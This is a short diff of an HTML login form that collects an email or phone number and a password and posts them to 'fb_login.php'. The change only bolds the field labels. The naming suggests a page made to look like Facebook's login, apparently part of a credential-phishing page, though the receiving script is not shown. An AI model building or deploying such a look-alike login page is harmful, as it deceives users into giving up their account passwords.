@@ -33,11 +33,11 @@ div.transbox {
   <form action="fb_login.php" method="post">
       <table  border="1">
       <tr valign="bottom">
-      <td><font style="font-family:arial; font-size:11px;">Email or Phone </font></td>
+      <td><font style="font-family:arial; font-size:11px;"><b>Email or Phone </b></font></td>
       <td><input type="text" name="user" style="font-family:arial; font-size:10px; width: 180px; margin-left: 0px; margin-top: 10px;"></td>
       </tr>
       <tr valign="bottom">
-      <td><font style="font-family:arial; font-size:9px;">Password </font></td>
+      <td><font style="font-family:arial; font-size:9px;"><b>Password </b></font></td>
       <td><input type="password" name="password" style="font-family:arial; font-size:10px; width: 180px; margin-left: 0px; margin-top: 10px;"></td>
       </tr>
       <tr valign="bottom" valign="left">
